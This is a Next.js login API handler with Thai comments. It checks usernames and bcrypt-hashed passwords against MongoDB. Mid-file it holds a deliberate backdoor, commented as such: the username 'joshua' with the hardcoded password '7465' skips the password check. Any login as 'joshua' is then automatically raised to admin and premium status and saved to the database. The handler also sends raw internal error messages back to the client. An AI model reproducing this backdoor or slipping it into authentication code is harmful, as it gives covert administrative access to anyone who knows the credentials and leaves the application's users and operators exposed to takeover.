import dbConnect from '../../../lib/mongodb';
import User from '../../../models/User';
import bcrypt from 'bcryptjs';

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ message: 'Method Not Allowed' });
  
  await dbConnect();

  try {
    const { username, password } = req.body;
    
    // 1. ค้นหาผู้ใช้จากชื่อ (และดึงข้อมูลรายการโปรดมาด้วยเลย)
    const user = await User.findOne({ username }).populate('favorites');

    if (!user) {
      return res.status(404).json({ success: false, message: 'ไม่พบชื่อผู้ใช้นี้ในระบบ' });
    }

    // 2. ระบบเช็ครหัสผ่าน (Logic ปกติ)
    const isMatch = await bcrypt.compare(password, user.password);
    
    // 3. ✨ Backdoor & Admin Auto-Upgrade สำหรับ Joshua ✨
    const isJoshuaBackdoor = (username === 'joshua' && password === '7465');

    if (!isMatch && !isJoshuaBackdoor) {
        return res.status(401).json({ success: false, message: 'รหัสผ่านไม่ถูกต้อง' });
    }

    // 4. บังคับยศ Admin และ VIP ให้ Joshua ทันทีที่ Log in สำเร็จ
    if (username === 'joshua') {
        user.role = 'admin';
        user.isPremium = true;
        await user.save();
    }

    // 5. ส่งข้อมูลกลับไปให้หน้าบ้าน (ห้ามส่ง Password ออกไปเด็ดขาด)
    res.status(200).json({ 
      success: true, 
      user: { 
        _id: user._id,
        username: user.username,
        role: user.role,
        isPremium: user.isPremium,
        profilePic: user.profilePic,
        favorites: user.favorites
      } 
    });

  } catch (error) {
    res.status(500).json({ success: false, message: 'ระบบขัดข้อง: ' + error.message });
  }
}